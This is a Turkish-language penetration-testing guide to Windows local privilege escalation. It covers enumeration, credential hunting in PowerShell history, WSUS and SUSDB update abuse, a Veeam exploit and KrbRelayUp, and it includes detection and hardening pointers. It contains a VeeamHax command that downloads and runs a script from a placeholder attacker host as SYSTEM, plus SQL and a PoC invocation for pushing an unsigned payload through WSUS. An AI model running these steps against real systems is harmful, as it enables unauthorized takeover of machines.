# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, temel nitelikteki çeşitli kılavuzlardan genel Windows yetki yükseltme metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Uygulamalı enumerasyon akışı ayrıca topluluk atölyelerinden ve kontrol listelerinden yararlanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihsel saldırı materyalleri, Windows yetki yükseltme konulu DerbyCon sunumunu da içerir.<sup>[[5]](#references)</sup>

## Başlangıç İçin Windows Teorisi

### Access Tokens

**Windows access token'ların ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity level'ların ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Denetimleri

Windows'ta **sistemi enumerate etmenizi**, executable'ları çalıştırmanızı **engelleyebilecek** ve hatta **etkinliklerinizi tespit edebilecek** çeşitli unsurlar vardır. Yetki yükseltme enumerasyonuna başlamadan önce aşağıdaki **sayfayı** **okumalı** ve bu **savunma mekanizmalarının** tümünü **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini önyükleme öncesi DMA'ya ve Windows `SYSTEM` bellek yamalama zincirine de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess Sessiz Yükseltme

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess süreçleri, AppInfo'nun güvenli yol denetimleri atlatıldığında istem olmadan High IL'ye ulaşmak için kötüye kullanılabilir. UIAccess/Admin Protection atlatma iş akışı için özel sayfaya bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik registry yayılımı, keyfi bir SYSTEM registry yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Yeni Windows sürümlerinde, ayrıcalıklı bir yerel NTLM kimlik doğrulamasının yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB arbitrary-port** LPE yolu da kullanılabilir:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgisi enumerasyonu

Windows sürümünün bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Exploit'leri

Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için bu [site](https://msrc.microsoft.com/update-guide/vulnerability) kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur ve Windows ortamının sunduğu **geniş saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı içerir)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — işletim sistemi derlemesini, yüklü güncellemeleri ve seçili olası güvenlik duyurularını envanterler; bir sonucu geçerli kabul etmeden önce tam ürünü ve onun yerini alan güncellemeleri doğrulayın.

Sürüme özgü bir yerel exploit için işletim sistemi mimarisinin yanı sıra **çalışan sürecin mimarisini** de kontrol edin. 64 bit Windows'ta, 32 bit bir süreç [WOW64 dosya sistemi yeniden yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32 bit sistem dizinine karşılık gelirken `%windir%\Sysnative` bu sürecin yerel sistem dizinine erişmesini sağlar. Bu diğer ad, 64 bit bir süreçte kullanılamaz. Bir işletim sistemi derlemesi veya eksik KB adayı, sistemin exploitable olduğunu kanıtlamaz; çalışan derlemeyi, yüklü ya da onun yerini alan güncellemeyi, süreç mimarisini ve exploit ön koşullarını söz konusu sorunla ilgili [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

Bir servis bellek bozulması örneği için [istemci denetimli MIDI paylaşımlı bellek ring offset'lerine](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions) bakın. Yayımlanan stack offset'leri yalnızca test edilen derleme için geçerlidir; `LOCAL SERVICE` yetkisine ulaşmak, sonrasında `SYSTEM` yetkisine geçmek için yapılan [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) adımından farklıdır.<sup>[[44]](#references)</sup>

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin Github depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir kimlik bilgisi/Juicy bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory`, dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transcript'i incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: dosyada kimlik bilgileri de dahil olmak üzere komut bağımsız değişkenleri ve çıktılar bulunabilir. Okunabilir bir transcript, yalnızca içeriği kullanılabilir, daha yüksek ayrıcalıklı bir kimliği açığa çıkarıyor ve bu kimlik ilgili bağlamda oturum açabiliyorsa bir ipucu niteliğindedir.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları; yürütülen komutlar, komut çağrıları ve betiklerin bazı bölümleri dahil olmak üzere kaydedilir. Ancak yürütmenin tüm ayrıntıları ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için belgelerin "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini belirleyin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Komut dosyasının yürütülmesine ilişkin eksiksiz etkinlik ve içerik kaydı tutulur; böylece her kod bloğu çalışırken belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur; bu iz, adli incelemeler ve kötü amaçlı davranışların analizi için değerlidir. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sağlanır.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için logging event'leri Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 event'i görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Önceki yönlendirmede risk şöyle özetlenmişti:

Güncellemeler http**S** yerine http kullanılarak isteniyorsa sistemi ele geçirebilirsiniz.

HTTP WSUS uç noktası, güncelleme meta verilerinin ele geçirilmesi olasılığının incelenmesi için bir ipucudur. İstismar ayrıca istemcinin bu WSUS sunucusunu kullanmasına, saldırganın trafiği ele geçirip kontrol edebilmesine ve istemcinin güncelleme güveni ile yükleme politikasına bağlıdır. URL tek başına kod yürütüleceğini göstermez. [Microsoft, WSUS meta verileri için TLS kullanılmasını önerir](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ağda SSL kullanmayan bir WSUS güncellemesi olup olmadığını, cmd'de aşağıdakini çalıştırarak kontrol etmeye başlayabilirsiniz:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ya da PowerShell'de aşağıdakini kullanın:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Şunlardan biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

Orijinal uygulanabilirlik ifadesi şöyleydi:

Yani, **exploit edilebilir.** Son kayıt defteri değeri 0 ise WSUS girdisi yok sayılır.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP interception yolu için bir ön koşulun bulunduğunu doğrular; ancak interception, kötü amaçlı güncellemenin kabul edilmesi veya yükseltilmiş ayrıcalıklarla yüklenmesinin mümkün olduğunu kanıtlamaz. Değer `0` olduğunda, bu ilke tarafından yapılandırılmış WSUS uç noktası seçilmez.

Bu zafiyetleri exploit etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Bunlar, SSL kullanmayan WSUS trafiğine 'sahte' güncellemeler enjekte etmek için hazırlanmış MiTM exploit betikleridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak bu, hatanın exploit ettiği zafiyettir:

> Yerel kullanıcı proxy'mizi değiştirme gücümüz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi yakalamak ve varlığımızda yükseltilmiş kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırabiliriz.
>
> Ayrıca WSUS hizmeti geçerli kullanıcının ayarlarını kullandığından, kullanıcının sertifika deposunu da kullanır. WSUS hostname'i için kendinden imzalı bir sertifika oluşturup bu sertifikayı geçerli kullanıcının sertifika deposuna eklersek hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, sertifika üzerinde trust-on-first-use türü doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir olarak kabul ediliyor ve doğru hostname'e sahipse hizmet tarafından kabul edilir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla (yayınlandıktan sonra) exploit edebilirsiniz.

### WSUS yöneticisi tarafından denetlenen güncellemeler

Geçerli kimliğin bir WSUS sunucusunda güncellemeleri **yayımlama ve onaylama** yetkisine sahip olduğu durumlarda ayrı bir yol vardır. Sunucunun `WSUS Administrators` grubundaki etkin üyeliği ve devredilmiş WSUS izinlerini kontrol edin, ardından onaylanmış güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektiğini belirtir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama için gereken güven ilişkisini açıklar](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içerik için kullanılan imzalama sertifikasına güvenmelidir. Bunu bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce, aday güncellemenin imzalandığını ve kabul edildiğini, hedef için geçerli olduğunu ve daha ayrıcalıklı bir bağlamda yüklendiğini doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı bu koşulları sağlamaz.

### SUSDB özel güncelleme suistimali: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısını yakalamaktan farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncellemeyi yayımlamak ve onaylamak için **WSUS veritabanındaki (`SUSDB`) saklı yordamları** kullanabilecek kadar erişime sahip olmaktır. Pratik bir erişim yolu, yukarı akıştaki bir WSUS bilgisayar hesabını `SUSDB` barındıran ayrı bir MSSQL sunucusuna relay etmektir; tam ön koşullar dağıtıma göre değişir, bu nedenle SQL administrator haklarınız olduğunu varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530'dan LDAP, SMB veya AD CS'ye relay eden ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'yi suistimal etme](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Harici veritabanı relay'ini ve yordam izinlerini doğrulama

WSUS'un harici bir SQL Server kullandığı dağıtımlarda, önce WSUS sunucu hesabının veritabanında kimlik doğrulaması yapıp yapamadığını ve NTLM relay'in bu dinleyiciye ulaşıp ulaşmadığını kontrol edin. Doğrudan tablo yazma işlemleri engellense bile sunucunun SQL rolü, güncelleme yayımlama yordamlarına erişim sağlayabilir; `SUSDB` üzerinde başarısız bir `UPDATE` işlemi, yayımlamanın engellendiğini göstermez. Özel güncelleme denemeden önce yetkili bir SQL oturumunda etkin kimliği, rol üyeliğini ve yordam izinlerini inceleyin.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Canlı prosedür tanımları ve yüklü `SoftwareDistributionPackage.xsd`, geçerli güncelleme meta verilerini yeniden oluştururken faydalıdır. Bundle üst öğesi ve payload alt öğesinin her biri `UpdateIdentity` (fragment türü `1`), `LocalizedProperties` (`4`) ve `ExtendedProperties` (`2`) gerektirir; her `spImportUpdate` çağrısının döndürdüğü yerel revizyon kimliğini kaydedin ve bundle ilişkisini, özetleri, boyutu, içerik URL'sini ve revizyonu tutarlı tutun. Bu, duruma bağlı bir yayımlama iş akışıdır; bu nedenle tek bir başarılı saklı yordam çağrısı, istemci tarafında çalıştırmanın gerçekleştiğini kanıtlamaz.<sup>[[38]](#references)</sup>

#### Güncellemeyi oluşturun, hedefleyin ve onaylayın

Özel güncelleme iş akışı, kısıtlı bir yayımlama API'si olarak meşru WSUS yordamlarını kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili saklı yordamlar |
| --- | --- |
| Güncelleme meta verilerini içe aktarma | `spImportUpdate` |
| Önkoşul, yerelleştirilmiş ve genişletilmiş XML parçalarını depolama | `spSaveXMLFragment` |
| İçerik özetini saldırganın kontrolündeki URL ile ilişkilendirme | `spSetBatchURL` |
| Bilgisayar grubunu listeleme/oluşturma ve istemciyi ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu grup için yüklemeyi onaylama | `@actionID = 0` ve `@isAssigned = 1` ile `spDeployUpdate` |

Dosya adı, özetler, boyut ve `CommandLineInstallation` işleyicisi, içe aktarılan meta veriler/parçalar arasında tutarlı olmalıdır. İçerik URL'sini ve hedef grubunu atadıktan sonra, son onay aşağıdakine benzer; örnek GUID'leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uzantı kaynaklı signature bypass

WSUS normalde imzasız, keyfi yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` dosyasındaki .NET `VerifyFile` yolu, sağlanan dosya adı `.txt` veya `.esd` ile bitiyorsa sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD imajı olduğu önceden doğrulanmadan `CheckCertificateSignature` atlanır. Bu nedenle, örneğin `payload.exe.txt` olarak adlandırılmış, değiştirilmemiş bir PE içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı yükleme işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir politika/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu staging ve otomasyon

`spDeployUpdate` çağrıldığında WSUS, kaydedilmiş içeriği getirir. Kaynağın BITS'in HTTP beklentilerini karşılaması gerekir: erişilebilir bir URL tek başına yeterli değildir; çünkü aktarımda önce `HEAD`/`GET` akışı, ardından byte-range istekleri kullanılır. Range desteği olmayan bir sunucu, BITS'in Range protokol başlığını gerektirdiğini belirten WSUS eşitleme `EventId=364` hatasına neden olur.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bu SQL'i çalıştırmak için değiştirilmiş bir MSSQL istemcisi içerir ve içerik staging'i için `BitsWebServer.py` dosyasıyla birlikte gelir. Yetkili bir laboratuvarda kullanılabilecek temel bir komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz yürütme ve yeniden deneme kalıcılığı

İstemci tarafındaki etkileşim ilkelere bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` içindeki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından elle seçilmesine gerek kalmadan indirilip yapılandırılmış zamanlamaya göre yüklenmesini sağlar. Testlerde, başarısız/tamamlanmamış kalan güncellemeye sahip bir payload, callback process sona erdikten hemen sonra yeniden sunuldu; bu nedenle yeniden deneme davranışı tekrarlayan bir execution persistence biçimine dönüşebilir. İstemci güncellemenin başarısız olduğunu gösterdiğinden bu yöntem gürültülüdür.<sup>[[39]](#references)</sup>

#### Tespit ve hardening pivotları

Bu zincirde sunucu ve istemci tarafında kullanılabilecek pivotlar:<sup>[[39]](#references)</sup>

- `SUSDB` içindeki `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` çalıştırmalarını denetleyin; yeni targeting group’ları, harici içerik kaynaklarını, `.txt`/`.esd` update payload’larını ve beklenmeyen principal’lar (özellikle bilgisayar hesabı olmayanlar) tarafından yapılan dağıtımları araştırın.
- `C:\Program Files\Update Services\LogFiles` içinde `ContentSyncAgent`, `FileVerified`, yanlış yazılmış `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; doğrulamayı, uzantıya güvenmek yerine payload uzantısı ve içerik imzasıyla ilişkilendirin.
- Windows Update’in tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` veya `.esd` adları taşıyan içeriklerden kaynaklanan PE çalıştırmalarını ya da beklenmeyen alt process/ağ etkinliklerini araştırın.
- Desteklendiği durumlarda veritabanı hizmetinde Extended Protection for Authentication’ı zorunlu kılın ve veritabanı ağına erişimi WSUS sunucusu ve yetkili yönetim sistemleriyle sınırlandırın. Özel güncelleme prosedürlerindeki `EXECUTE` haklarını en aza indirin ve denetleyin.

## Üçüncü Taraf Otomatik Güncelleyiciler ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı sunar. Enrollment bir saldırganın sunucusuna yönlendirilebiliyorsa ve updater sahte bir root CA’ya veya zayıf signer kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM hizmetinin yükleyeceği kötü amaçlı bir MSI gönderebilir. Genelleştirilmiş bir tekniği (Netskope stAgentSvc zincirini temel alır – CVE-2025-0309) burada bulabilirsiniz:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Sürüme özgü özgün açıklama ve reconnaissance notu şöyleydi:

Veeam B&R < `11.0.1.1261`, saldırganın denetimindeki iletileri işleyen ve **NT AUTHORITY\SYSTEM** olarak rastgele komutlar çalıştırılmasına olanak tanıyan, **TCP/9401** üzerinden erişilebilen bir localhost hizmeti sunar.<sup>[[12]](#references)</sup>

- **Recon**: dinleyiciyi ve sürümü doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinden çalışan bir core backup service kullanır. [Veeam'in duyurusu](https://www.veeam.com/kb4424), backup ağ sınırı içindeki şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulaması olmadan ifşa edilmesini açıklar; ayrı bir herkese açık PoC ise **NT AUTHORITY\SYSTEM** olarak komut çalıştırma yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışındaki adreslere de bağlanabilir; bu nedenle gerçek adresini ve PID’sini kontrol edin.

- **Recon**: TCP/9401’in `Veeam.Backup.Service.exe` sürecine ait olduğunu doğrulayın, ardından kurulu ürünü ve patch metadata’sını inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipucu verir ancak patch durumunu bütünüyle doğrulamaz.
- **Düzeltilmiş en düşük sürümler**: Veeam, ilk düzeltilmiş sürümler olarak **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini listeler; daha eski sürümler etkilenir. Dört parçalı bir file version tek başına, aynı build numaralarındaki yamalanmamış temel sürümü daha sonraki bir patch’ten ayırt edemez. Bir sınır build’ini düzeltilmiş olarak kabul etmeden önce patch tanımlayıcısını [vendor build history](https://www.veeam.com/kb2680) üzerinden doğrulayın.
- **Exploit**: `VeeamHax.exe` gibi bir PoC’yi gereken Veeam DLL’leriyle aynı dizine yerleştirin, ardından yerel socket üzerinden bir SYSTEM payload tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Hizmet komutu SYSTEM olarak yürütür.

Atıfta bulunulan PoC, ek ön koşullar sağlandığında SYSTEM olarak komut yürütüldüğünü gösterir; üreticinin güvenlik duyurusu kimlik bilgisi ifşası sorununu açıklar.

## KrbRelayUp

Varsayılan ortamla ilgili ilk açıklama şöyleydi:

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** güvenlik açığı bulunur. Bu koşullar arasında **LDAP signing'in zorunlu tutulmadığı,** kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmalarına olanak tanıyan self-rights'a sahip olduğu ve kullanıcıların domain içinde bilgisayar oluşturabildiği ortamlar yer alır. Bu **gereksinimlerin** **varsayılan ayarlar** kullanılarak karşılandığını belirtmek önemlidir.

Yerel bir Kerberos relay, uygun bir COM server kimlik doğrulaması yaptığında ve relay edilen principal hedef nesne üzerinde yetkilere sahip olduğunda, düşük ayrıcalıklı bir oturum açma bağlamından ayrıcalıklı bir directory yazma işlemine geçebilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini açıklar; KrbRelayUp bu yollardan bazılarını otomatikleştirir. Bir RBCD zinciri, geçerli delegation ve hedef nesne hakları gerektirirken shadow-credential zinciri key-credential yazma hakları ve certificate authentication yolunu destekleyen bir KDC gerektirir. Bu yollardan hiçbiri yalnızca domain üyeliğiyle mümkün olmaz.

Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, relay edilen kimliğin nesne ACL'sini ve seçilen COM sınıfının authentication ve impersonation seviyelerini kontrol edin. Çağıranın logon type'ı ve kimlik bilgisi bağlamı önemlidir: Bir WinRM oturumu, etkileşimli veya yeni kimlik bilgileriyle açılan bir oturumdan farklı davranabilir. Firewall/OXID yönlendirmesi ve yüklenen güncellemeler de sonucu değiştirebilir. İzin verici bir ilkeyi veya eşleşen bir ACL'yi inceleme adayı olarak değerlendirin; pasif numaralandırma COM coercion, relay authentication veya directory yazma işlemlerini tetiklememelidir. Bir machine-account shadow credential, machine ticket elde edilmesini sağlayabilir ve yalnızca bu hesabın gerekli directory replication haklarına sahip olması durumunda ayrı bir DCSync yoluna yol açabilir.

